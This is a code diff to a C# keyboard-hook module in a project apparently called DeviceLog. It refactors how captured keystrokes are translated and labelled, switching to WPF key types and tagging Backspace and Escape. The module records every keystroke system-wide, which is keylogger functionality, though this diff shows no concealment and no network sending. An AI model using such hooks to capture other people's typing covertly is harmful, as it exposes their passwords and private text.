@@ -1,7 +1,7 @@
 ﻿using System;
 using System.Runtime.InteropServices;
 using System.Text;
-using System.Windows.Forms;
+using System.Windows.Input;
 
 namespace DeviceLog.Classes.Modules.Keyboard
 {
@@ -25,9 +25,6 @@ namespace DeviceLog.Classes.Modules.Keyboard
         [DllImport("user32.dll")]
         private static extern short GetKeyState(int nVirtKey);
 
-        [DllImport("user32.dll")]
-        private static extern short GetAsyncKeyState(int nVirtKey);
-
         [DllImport("user32.dll", SetLastError = true)]
         private static extern int GetKeyboardState(byte[] lpKeyState);
 
@@ -36,19 +33,17 @@ namespace DeviceLog.Classes.Modules.Keyboard
 
         private delegate int CallbackDelegate(int code, int w, ref KbdllHookStruct l);
 
-        private const byte VkReturn = 0X0D; //Enter
-        private const byte VkSpace = 0X20; //Space
         private const byte VkShift = 0x10;
         private const byte VkCapital = 0x14;
 
         [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
         private struct KbdllHookStruct
         {
-            internal uint vkCode;
-            internal uint scanCode;
-            internal uint flags;
-            private uint time;
-            private uint dwExtraInfo;
+            internal readonly uint vkCode;
+            internal readonly uint scanCode;
+            internal readonly uint flags;
+            private readonly uint time;
+            private readonly uint dwExtraInfo;
         }
 
         internal enum KeyEvents
@@ -106,6 +101,7 @@ namespace DeviceLog.Classes.Modules.Keyboard
             if (code < 0) return CallNextHookEx(_hookId, code, w, ref l);
 
             KeyEvents kEvent = (KeyEvents)w;
+            Key dataKey = KeyInterop.KeyFromVirtualKey((int)l.vkCode);
 
             bool isDownShift = (GetKeyState(VkShift) & 0x80) == 0x80;
             bool isDownCapslock = GetKeyState(VkCapital) != 0;
@@ -117,16 +113,30 @@ namespace DeviceLog.Classes.Modules.Keyboard
 
             int res = ToUnicodeEx(l.vkCode, l.scanCode, keyState, sbString, sbString.Capacity, l.flags, GetKeyboardLayout(0));
 
-            if (res == 1)
+            // Key can be translated to unicode
+          if (res == 1)
             {
                 char key = sbString[0];
                 
-                if ((isDownCapslock || isDownShift))
+                if ((isDownCapslock || isDownShift) && char.IsLetter(key))
                 {
                     key = char.ToUpper(key);
                 }
 
                 string result = key.ToString();
+
+                if (char.IsControl(key))
+                {
+                    switch (dataKey)
+                    {
+                        case Key.Back:
+                            result = "[Back]";
+                            break;
+                        case Key.Escape:
+                            result = "[ESC]";
+                            break;
+                    }
+                }
                 
                 if (kEvent == KeyEvents.KeyDown || kEvent == KeyEvents.SKeyDown)
                 {
@@ -142,14 +152,13 @@ namespace DeviceLog.Classes.Modules.Keyboard
             {
                 if (_logSpecialKeys)
                 {
-                    Keys key = (Keys)l.vkCode;
                     if (kEvent == KeyEvents.KeyDown || kEvent == KeyEvents.SKeyDown)
                     {
-                        KeyDown?.Invoke("[" + key + "]");
+                        KeyDown?.Invoke("[" + dataKey + "]");
                     }
                     else if (kEvent == KeyEvents.KeyUp || kEvent == KeyEvents.SKeyUp)
                     {
-                        KeyUp?.Invoke("[" + key + "]");
+                        KeyUp?.Invoke("[" + dataKey + "]");
                     }
                 }
             }
